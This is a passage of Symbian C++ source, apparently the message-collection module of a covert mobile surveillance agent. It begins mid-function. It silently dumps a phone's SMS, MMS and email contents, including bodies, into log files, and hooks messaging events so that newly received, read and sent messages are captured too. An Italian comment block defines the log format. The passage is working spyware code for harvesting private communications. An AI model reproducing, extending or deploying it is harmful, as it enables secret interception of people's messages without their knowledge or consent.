				}
			return;
			}
		// we are dumping mail messages
		// this is always done after sms/mms dump
		--iMailboxesCounter;
		if(iMailboxesCounter<0)
			{
			// finished dump, write markup,
			RBuf8 buf(GetMarkupBufferL(iMarkup));
			buf.CleanupClosePushL();
			if (buf.Length() > 0)
				{
				iMarkupFile->WriteMarkupL(Type(),buf);
				}
			CleanupStack::PopAndDestroy(&buf);
						
			//subscribe to notifications
			for(TInt i=0; i < iMailboxes.Count(); i++)
				{
				MEmailMailbox* mailbox = iMailboxes[i];
				mailbox->RegisterObserverL(*this);
				}
			return;
			}
		MEmailMailbox* mailbox = iMailboxes[iMailboxesCounter];
		TEmailSortCriteria criteria;  //emailsorting.h
		criteria.iAscending = ETrue;
		criteria.iField = TEmailSortCriteria::EByDate;
		RSortCriteriaArray sortCriteriaArray;
		CleanupClosePushL(sortCriteriaArray);
		sortCriteriaArray.Append(criteria);
		RFolderArray folders;
		mailbox->GetFoldersL(folders);
		for(TInt j=0; j < folders.Count(); j++)
			{
			MEmailFolder* folder = folders[j];
			CleanupReleasePushL(*folder);
			MMessageIterator* msgIterator = folder->MessagesL(sortCriteriaArray);
			if (msgIterator) 
				{
				CleanupReleasePushL(*msgIterator);
				//TInt msgCount = msgIterator->Count();
				MEmailMessage* msg = NULL;
				while ( NULL != (msg = msgIterator->NextL())) 
					{
					if(/*iMailCollectFilter->iLog && */iMailCollectFilter->MessageInRange(msg->Date()))
						{
						RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
							{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								}
							}
						CleanupStack::PopAndDestroy(&buf);
						}
					msg->Release();
					}
				CleanupStack::PopAndDestroy(msgIterator);
				}						
			CleanupStack::PopAndDestroy(folder);
			}
		folders.Close();
		CleanupStack::PopAndDestroy(&sortCriteriaArray);
		}
	else
		{
		// we are traversing messaging store for sms and mms
		__FLOG(_L("PopulateArray"));
		// Note: it always exists at least 1 entry in the Array (KMsvRootIndexEntryId)
		// Adds the childs entries to the array so will be processed later.
		PopulateArrayWithChildsTMsvIdEntriesL(iMsvArray[iArrayIndex]);  

		TMsvId msvId = iMsvArray[iArrayIndex];

		TMsvId service;
		TMsvEntry msvEntryIdx;
		TInt res = iMsvSession->GetEntry(msvId, service, msvEntryIdx);
		if ((res == KErrNone) && (msvEntryIdx.iType.iUid == KUidMsvMessageEntryValue))
			{
			// there's no error and the entry is a message, not KUidMsvServiceEntryValue, KUidMsvFolderEntryValue, KUidMsvAttachmentEntryValue
			if(msvEntryIdx.iMtm == KUidMsgTypeSMS)   //SMS
				{
				if(iSmsCollectFilter->iLog && iSmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
					{
					RBuf8 buf(GetSMSBufferL(msvEntryIdx,msvId));
					buf.CleanupClosePushL();
					if (buf.Length() > 0)
						{
						TInt value;
						RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
						if(value)
							{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_SMS);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							}
						}
					CleanupStack::PopAndDestroy(&buf);
					}
				}
			
			else if (msvEntryIdx.iMtm == KUidMsgTypeMultimedia)   // MMS
				{
				if(iMmsCollectFilter->iLog && iMmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
					{
					RBuf8 buf(GetMMSBufferL(msvEntryIdx,msvId));
					buf.CleanupClosePushL();
					if (buf.Length() > 0)
						{
						TInt value;
						RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
						if(value)
							{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_MMS);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							}
						}
					CleanupStack::PopAndDestroy(&buf);
					}
				}
			
			}
	
		iArrayIndex++;
		if (iArrayIndex >= iMsvArray.Count())	
			{
			// we have finished the initial sms/mms dump
			__FLOG_1(_L("Processed: %d Entries"), iMsvArray.Count());
			iArrayIndex = 0;
			iMsvArray.Reset();
			iMsvArray.Append(KMsvRootIndexEntryId);
			//let's start mail dump
			iMailDump = ETrue;
			}
		}
	
	iLongTask->NextRound();
	}

void CAgentMessages3::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3)
	{
	if (!iLogNewMessages)
		return;
	CMsvEntrySelection* entries = STATIC_CAST( CMsvEntrySelection*, aArg1 );
	TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );

	__FLOG(_L("HandleSessionEventL"));
	if (entries != NULL)
		{
		__FLOG_1(_L("Entry:%d "), entries->At(0));
		}
	if (folderId != NULL)
		{
		__FLOG_1(_L("Folder:%d "), *folderId);
		}
	switch (aEvent)
		{
		case EMsvServerReady:
			{
			__FLOG(_L("Server Ready"));
			break;
			}
		case EMsvEntriesCreated:
			{
			__FLOG(_L("Created"));
			iNewMessageId = entries->At(0);
			// It is not safe to read the message when it has been created in draft or in inbox... 
			// so we will read it later on Changed Event
			break;
			}
		case EMsvEntriesChanged:
			{
			//aArg1 is a CMsvEntrySelection of the index entries. aArg2 is the TMsvId of the parent entry. 

			__FLOG(_L("Changed"));
			if (iNewMessageId != entries->At(0))
				return;

			// This event will be fired also when the user open a new message for the first time. 
			// (Because the message will change its status and will be marked as read)
			TMsvEntry msvEntry;
			TMsvId service;
			__FLOG(_L("GetEntry"));
			TInt res = iMsvSession->GetEntry(iNewMessageId, service, msvEntry);
			TMsvId msvId = entries->At(0);
			//if (msvEntry.Complete() && msvEntry.New() && (*folderId == KMsvGlobalInBoxIndexEntryId)) // this is original code MB, but on N96 check on New() fails
			if (msvEntry.Complete() /*&& msvEntry.New()*/ && (*folderId == KMsvGlobalInBoxIndexEntryId))
				{
				TBool writeMarkup = EFalse;
				// sms
				if(msvEntry.iMtm == KUidMsgTypeSMS)
				{ 
					if(iSmsRuntimeFilter->iLog)
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
												
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_SMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
				// mms
				else if(msvEntry.iMtm == KUidMsgTypeMultimedia)
					{
						if(iMmsRuntimeFilter->iLog)
						{
							RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
							{
								TInt value;
								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
													
								if(value)
									{
									CLogFile* logFile = CLogFile::NewLC(iFs);
									logFile->CreateLogL(LOGTYPE_MMS);
									logFile->AppendLogL(buf);
									logFile->CloseLogL();
									CleanupStack::PopAndDestroy(logFile);
									writeMarkup = ETrue;
									}
							}
							CleanupStack::PopAndDestroy(&buf);
						}
					}
				iNewMessageId = 0;
				}

			break;
			}
		case EMsvEntriesMoved:
			{
			// aArg1 is a CMsvEntrySelection containing the IDs of the moved entries. aArg2 is the TMsvId of the new parent. aArg3 is the TMsvId of the old parent entry. 

			__FLOG(_L("Moved"));
			TMsvEntry msvEntry;
			TMsvId service;
			TInt res = iMsvSession->GetEntry(entries->At(0), service, msvEntry);
			TMsvId msvId = entries->At(0);

			TBool writeMarkup = EFalse;
			
			if (msvEntry.Complete() && *folderId == KMsvSentEntryId)
			{
				if(msvEntry.iMtm == KUidMsgTypeSMS) 
				{
					if(iSmsRuntimeFilter->iLog)
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_SMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			}
			else if(msvEntry.iMtm == KUidMsgTypeMultimedia) 
				{
					if(iMmsRuntimeFilter->iLog)
					{
						RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
								}
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			break;
			}
		default:
			break;
		}
	}


HBufC8* CAgentMessages3::GetMarkupBufferL(const TMarkup aMarkup)
{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(aMarkup);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &aMarkup, sizeof(aMarkup));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}

void CAgentMessages3::NewMessageEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aNewMessages, const TFolderId& aParentFolderId )
	{
	// when the mailbox connects and finds new messages
	// we aren't interested in this, because body is retrieved in MessageChangedEventL
	}
    
void CAgentMessages3::MessageChangedEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aChangedMessages, const TFolderId& aParentFolderId )
	{
	// we are forcing a check:
	// in theory we aren't subscribed to mail events if mail dump not enabled...
	if(!iMailRuntimeFilter->iLog)
		return;
	// when the user reads a message never read before or when a user creates a new message
	for (TInt i = 0; i < iMailboxes.Count(); i++)
		{
		if(iMailboxes[i]->MailboxId() == aMailbox)
			{
			MEmailMailbox* mailbox = iMailboxes[i];
			for(TInt j=0; j < aChangedMessages.Count(); j++)
				{
				MEmailMessage* msg = mailbox->MessageL(aChangedMessages[j]);
				MEmailFolder* folder = mailbox->FolderL(msg->ParentFolderId());
				TInt flags = msg->Flags();
				TFolderType type = folder->FolderType();
				if(type == ESent)
					{
					// a new outgoing message, we ignore EDrafts and EOutbox event
					if(iLastSavedMail != msg->Date())
						{
						// we receive more than one notification, so we have to be sure to dump
						// only once
						iLastSavedMail = msg->Date();
						RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
							{
							TInt value;
							RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
							if(value)
								{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								}
							}
						CleanupStack::PopAndDestroy(&buf);
						}
					}
				if((type == EInbox) || (type == EOther))
					{
					// a new incoming message
					if(flags == 3)  // EFlag_Read_Locally | EFlag_Read   
						{
						if(iLastSavedMail != msg->Date())
							{
							iLastSavedMail = msg->Date();
							RBuf8 buf(GetMailBufferL(msg,iMailCollectFilter));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
								{
								TInt value;
								RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
								if(value)
									{
									CLogFile* logFile = CLogFile::NewLC(iFs);
									logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
									logFile->AppendLogL(buf);
									logFile->CloseLogL();
									CleanupStack::PopAndDestroy(logFile);
									}
								}
							CleanupStack::PopAndDestroy(&buf);
							}
						}
					}
				msg->Release();
				folder->Release();
				}
			}
		}
	}
    
void CAgentMessages3::MessageDeletedEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aDeletedMessages, const TFolderId& aParentFolderId )
	{
	// when a message is deleted
	// we aren't interested in this
	}


void CAgentMessages3::RetrieveTotalBodyL(MEmailMessageContent* aContent, RBuf& aData)
{
    MEmailMultipart* mPart = aContent->AsMultipartOrNull();
    if (mPart) {
        TInt partCount = 0;
        TRAPD(err, partCount = mPart->PartCountL());
            if (err == KErrNone) {
                for (TInt i = 0; i < partCount; i++) {
                    MEmailMessageContent* content = NULL;
                    TRAPD(err2, content = mPart->PartByIndexL(i));
                    if (err2 == KErrNone) {
                        RetrieveTotalBodyL(content, aData);
                        content->Release();
                    }
                }
            }
            return;
        }
 
    MEmailTextContent* textContent = aContent->AsTextContentOrNull();
    if (textContent) { 
    	// Available (=fetched) size accessor. If this is less than value from
    	// TotalSize(), Fetch() should be used to retrieve more data from
    	// remote mail server.
        TInt availableSize = textContent->AvailableSize();
        //TInt totalSize = textContent->TotalSize();
        if(availableSize!=0){
        	aData.Close();
        	aData.Create(textContent->ContentL());        
        }      
    }   
    return;
}

/*
 * A filetime is a 64-bit value that represents the number of 100-nanosecond intervals 
 * that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).
 * Please also note that in defining KInitialTime the month and day values are offset from zero.
 * 
 */
// TODO: delete this method when finished mail test
/*
void CAgentMessages3::WriteMailFile(const TDesC8& aData)
{
	RFile file;
	RFs fs;
		
	TFullName filename(_L("E:\\Data\\mail.txt"));
	
	fs.Connect();
	
	file.Replace(fs, filename, EFileWrite | EFileStream | EFileShareAny);
	file.Write(aData);
	file.Flush();
	fs.Close();
}
*/

/*
 * PER LA CREAZIONE DEL LOG:
 * 
 Per prima cosa c'e' un header che descrive il log:
>
> struct MAPISerializedMessageHeader {
>   DWORD dwSize;             // size of serialized message (this struct
> + class/from/to/subject + message body + attachs)
>   DWORD VersionFlags;       // flags for parsing serialized message
>   LONG Status;              // message status (non considerarlo per
> ora, mettilo a 0)
>   LONG Flags;               // message flags
>   LONG Size;                // message size    (non considerarlo per
> ora, mettilo a 0)
>   FILETIME DeliveryTime;    // delivery time of message (maybe null)
>   DWORD nAttachs;           // number of attachments
> };
>
> VersionFlags per il momento e' definito solo con
> enum VersionFlags {
>   MAPI_V1_0_PROTO          = 0x01000000,  // Protocol Version 1
> };
> L' unico valore per Flags invece e'
> enum MessageFlags {
>     MESSAGE_INCOMING       = 0x00000001,
> };
>
> Questo header e' seguito dai soliti blocchi costituiti dal  
> PREFIX+stringa o PREFIX+DATA
> I tipi di per il PREFIX  che puoi utilizzare sono questi:
>
> enum ObjectTypes {
>   STRING_FOLDER            = 0x01000000,
>   STRING_CLASS             = 0x02000000,
>   STRING_FROM              = 0x03000000,
>   STRING_TO                = 0x04000000,
>   STRING_CC                = 0x05000000,
>   STRING_BCC               = 0x06000000,
>   STRING_SUBJECT           = 0x07000000,
>
>   HEADER_MAPIV1            = 0x20000000,
>
>   OBJECT_MIMEBODY          = 0x80000000,
>   OBJECT_ATTACH            = 0x81000000,
>   OBJECT_DELIVERYTIME      = 0x82000000,
>
>   EXTENDED                 = 0xFF000000,
> };
>
> La FOLDER e' la cartella dove sono posizionati i messaggi, per esempio
> Inviati, In arrivo etc ... se in symbian non esiste una cosa del
> genere definiremo qualcuna.
> La classe del messaggio non e' indispensabile visto che sono gia'
> divisi per logtype, comunque se ti costa poco aggiungila:
> #define CLASS_SMS     TEXT("IPM.SMSText*")
> #define CLASS_MAIL     TEXT("IPM.Note*")
> #define CLASS_MMS     TEXT("IPM.MMS*")
>
> I sucessivi tipi sono esplicativi a parte HEADER_MAPIV1,
> OBJECT_ATTACH, OBJECT_DELIVERYTIME,  EXTENDED che puoi ignorare.
>
> Per quanto riguarda OBJECT_MIMEBODY, devi dirmi se in symbian riesci a
> recuperare il body in formato mime.
 */
 
